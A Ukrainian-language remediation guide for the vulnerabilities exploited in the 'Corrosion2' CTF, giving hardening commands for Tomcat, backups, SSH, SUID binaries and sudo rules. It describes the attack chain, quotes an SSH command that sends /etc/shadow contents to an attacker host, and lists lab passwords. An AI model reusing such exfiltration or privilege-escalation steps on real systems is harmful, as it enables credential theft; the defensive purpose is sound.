# Corrosion2 — Інструкція з усунення вразливостей

Документ описує практичні кроки з усунення вразливостей, виявлених під час проходження CTF "Corrosion2", у порядку їх експлуатації в атаці. Для кожного пункту вказано: вразливість, ризик, конкретні команди/дії з виправлення.

---

## 1. Надмірна поверхня атаки через відкриті сервіси

**Вразливість:** `nmap -sV` без жодних обмежень з боку мережі виявив усі три сервіси (22/SSH, 80/Apache, 8080/Tomcat) і їх версії.

**Ризик:** Повна карта сервісів і версій ПЗ дозволяє зловмиснику швидко звузити пошук відомих вразливостей (CVE) під конкретні версії.

**Виправлення:**
```sh
# Обмежити мережевий доступ лише довіреними джерелами
sudo ufw allow from 10.0.0.0/24 to any port 22
sudo ufw allow from 10.0.0.0/24 to any port 8080
sudo ufw default deny incoming
sudo ufw enable
```
- Приховати версії ПЗ у банерах (`ServerTokens Prod` та `ServerSignature Off` для Apache; вимкнути банер версії Tomcat через `server.xml`).
- Розмістити керуючі інтерфейси (Tomcat Manager) **не на публічному порту**, а за VPN/бастіон-хостом.

## 2. Файл резервної копії (`backup.zip`), доступний публічно через HTTP

**Вразливість:** `dirb` на порту 8080 знайшов backup-файл `backup.zip`, що містив конфігураційні файли Tomcat з обліковими даними.

**Ризик:** Розміщення резервних копій у `webapps`/публічному каталозі — пряме порушення принципу розмежування "дані для розгортання" vs "дані, доступні ззовні" (OWASP A05 — Security Misconfiguration).

**Виправлення:**
```sh
# Прибрати backup-файли з публічних каталогів Tomcat
sudo find /var/lib/tomcat*/webapps -iname "*.zip" -o -iname "*backup*"
sudo mv /var/lib/tomcat*/webapps/backup.zip /var/backups/secure/
```
- Налаштувати окремий, недоступний ззовні каталог для резервних копій (`/var/backups/secure`, права `700`, власник — виділений сервісний акаунт).
- Автоматизувати бекапи через `cron` + `rsync`/`restic` з шифруванням на рівні сховища, а не паролем zip-архіву.
- Додати CI/CD-перевірку (pre-deploy hook), яка блокує публікацію артефактів з розширеннями `.zip`, `.bak`, `.old`, `.sql` у `webapps`.

## 3. Слабкий пароль zip-архіву (підбір через fcrackzip + rockyou.txt)

**Вразливість:** Пароль `@administrator_hi5` підібрано словниковою атакою за прийнятний час.

**Ризик:** PKZIP-шифрування архівів криптографічно слабке, а словниковий пароль робить офлайн-брутфорс тривіальним.

**Виправлення:**
- Використовувати **AES-256 через GPG** замість zip-паролів для шифрування чутливих архівів:
```sh
gpg --symmetric --cipher-algo AES256 backup.tar
```
- Впровадити корпоративну політику складності паролів (16+ символів, без словникових фраз, перевірка проти бази скомпрометованих паролів).
- Використовувати менеджер паролів для генерації та зберігання таких секретів замість людино-читабельних фраз.

## 4. Облікові дані Tomcat Manager у відкритому вигляді в `tomcat-users.xml`

**Вразливість:** `tomcat-users.xml` з парою `admin:melehifokivai` потрапив у публічно доступний backup-архів.

**Ризик:** Компрометація цього файлу дає прямий доступ до панелі керування додатками Tomcat — критичної точки входу.

**Виправлення:**
```xml
<!-- /etc/tomcat*/tomcat-users.xml -->
<!-- Обмежити роль manager-gui/manager-script лише необхідними обліковими записами -->
<role rolename="manager-gui"/>
<user username="admin" password="<НОВИЙ_СТІЙКИЙ_ПАРОЛЬ>" roles="manager-gui"/>
```
- Негайно змінити пароль після будь-якої підозри на витік.
- Обмежити доступ до `/manager` і `/host-manager` за IP на рівні `context.xml`:
```xml
<Valve className="org.apache.catalina.valves.RemoteAddrValve"
       allow="127\.\d+\.\d+\.\d+|10\.0\.0\.\d+"/>
```
- Ніколи не зберігати `tomcat-users.xml` у резервних копіях без шифрування або поза межами публічного каталогу.

## 5. Tomcat Manager дозволяє завантаження та розгортання довільних WAR-файлів

**Вразливість:** Отримавши облікові дані, зловмисник завантажив `revshell.war` (створений msfvenom) через легітимний функціонал Tomcat Manager і отримав RCE.

**Ризик:** Це класичний і добре задокументований вектор компрометації Tomcat (`T1190 Exploit Public-Facing Application`) — сам функціонал "deploy WAR" є легітимним, але за відсутності обмежень перетворюється на готовий механізм віддаленого виконання коду.

**Виправлення:**
- Вимкнути можливість розгортання додатків через веб-інтерфейс у production:
```xml
<!-- context.xml для /manager -->
<Context privileged="true" antiResourceLocking="false" docBase="${catalina.home}/webapps/manager">
    <!-- deployment лише через CI/CD, не через GUI -->
</Context>
```
- Розгортання додатків виконувати виключно через контрольований CI/CD-пайплайн з підписаними артефактами, а не через інтерактивний Manager у публічному доступі.
- Впровадити **MFA** для доступу до Tomcat Manager, якщо він все ж потрібен в інтерактивному режимі.
- Моніторити запуск процесів Tomcat worker з аномальними параметрами (реверс-шели зазвичай ініціюють вихідні з'єднання на нестандартні порти).

## 6. Повторне використання пароля (`melehifokivai`) для різних облікових записів

**Вразливість:** Той самий пароль, знайдений для Tomcat Manager, спрацював і для SSH-входу користувача `jaye`.

**Ризик:** Password reuse — одна з найпоширеніших причин каскадної компрометації: витік одного сервісу автоматично дає доступ до інших.

**Виправлення:**
- Впровадити політику унікальних паролів для кожного сервісу/облікового запису, в ідеалі — через менеджер паролів або vault.
- Перейти на SSH-автентифікацію ключами замість паролів:
```sh
# /etc/ssh/sshd_config
PasswordAuthentication no
PubkeyAuthentication yes
```
- Провести аудит усіх облікових записів системи на предмет однакових/схожих паролів (`pwdump` + порівняння хешів локально, у контрольованому режимі).

## 7. SUID-бінар `look`, що дозволяє читати довільні файли (`/etc/shadow`)

**Вразливість:** Користувач `jaye` мав доступ до нестандартного SUID-бінарника `look`, який через змінну `LFILE` дозволяв прочитати будь-який файл, включно з `/etc/shadow`.

**Ризик:** Це класичний приклад небезпечного SUID-біта на бінарнику, що не призначений для підвищених привілеїв (GTFOBins-патерн) — дозволяє повний дамп хешів паролів усіх користувачів системи.

**Виправлення:**
```sh
# Знайти всі нестандартні SUID/SGID бінарники в системі
sudo find / -perm -4000 -o -perm -2000 -type f 2>/dev/null

# Прибрати SUID-біт з бінарників, яким він не потрібен за замовчуванням
sudo chmod u-s /usr/bin/look
```
- Провести повний аудит SUID/SGID бінарників на відповідність еталонному списку дистрибутива (`dpkg -V` / `rpm -V` для перевірки відхилень від пакетних прав доступу).
- Впровадити періодичне сканування на появу нових SUID-бітів (`auditd` правило нижче) — будь-яка зміна має бути задокументованим виключенням.

## 8. Ексфільтрація хешів через SSH pipe без детекції

**Вразливість:** Дамп `/etc/shadow` було передано на атакуючу машину через `ssh kali@... "cat >> hashall.txt"` — легітимний канал, що не викликає підозр у типовому моніторингу мережі.

**Ризик:** Використання стандартних, дозволених протоколів (SSH) для ексфільтрації ускладнює детекцію на рівні мережевого периметра (DLP, IDS/IPS часто пропускають такий трафік як "нормальний SSH").

**Виправлення:**
- Впровадити моніторинг аномальної поведінки SSH-сесій (обсяг переданих даних, нетипові команди в сесії) через `auditd`/`osquery`/SIEM.
```sh
sudo auditctl -w /etc/shadow -p r -k shadow_read_attempt
```
- Обмежити вихідні SSH-з'єднання з серверів на довільні зовнішні хости через firewall egress-правила — сервери не повинні ініціювати довільні вихідні SSH-сесії без потреби.
- Впровадити DLP-рішення, що аналізує вміст переданих даних, а не лише протокол.

## 9. Злом пароля користувача `randy` через John the Ripper + rockyou.txt

**Вразливість:** Хеш пароля `randy` зламано офлайн за допомогою словникової атаки.

**Ризик:** Так само, як і в п. 3 та п. 6 — слабкі, словникові паролі є кореневою причиною каскадної компрометації облікових записів.

**Виправлення:**
- Впровадити складні паролі (16+ символів) з обов'язковою перевіркою через `pam_pwquality`:
```sh
# /etc/security/pwquality.conf
minlen = 16
dcredit = -1
ucredit = -1
ocredit = -1
```
- Перейти на автентифікацію без паролів (SSH-ключі, Kerberos, SSO) для всіх облікових записів, де це технічно можливо.
- Впровадити ротацію паролів і моніторинг спроб автентифікації (`fail2ban` для SSH).

## 10. Небезпечний sudo-дозвіл на запуск Python-скрипта (`randombase64.py`) без обмеження оточення

**Вразливість:** Користувачу `randy` дозволено запускати `/home/randy/randombase64.py` через `sudo`, скрипт імпортує системний модуль `base64`, права на запис до якого (`/usr/lib/python3.8/base64.py`) мали недостатні обмеження, що дозволило library hijacking.

**Ризик:** Будь-який sudo-дозвіл на запуск скрипта, що імпортує модулі з записуваних шляхів, є вектором підвищення привілеїв — класичний приклад **Python Module Hijacking / PYTHONPATH abuse**.

**Виправлення:**
```sh
# Перевірити права доступу до системних бібліотек Python
ls -la /usr/lib/python3.8/base64.py
# Права мають бути: root:root, 644 (без права запису для інших користувачів/груп)
sudo chown root:root /usr/lib/python3.8/base64.py
sudo chmod 644 /usr/lib/python3.8/base64.py
```
- Переглянути всі правила `sudo -l` на предмет скриптів, що виконуються з підвищеними привілеями:
```sh
sudo visudo
# Прибрати або максимально звузити дозволи NOPASSWD / ALL для randombase64.py
```
- Якщо скрипт справді потрібен з правами root — запускати його через виділений **systemd service** з `ProtectSystem=strict`, `NoNewPrivileges=yes` та мінімальним набором capabilities, а не через `sudo` для інтерактивного користувача.
- Застосувати принцип найменших привілеїв: окремі sudo-дозволи мають бути максимально вузькими (конкретний скрипт з фіксованими аргументами, без можливості підміни залежностей).
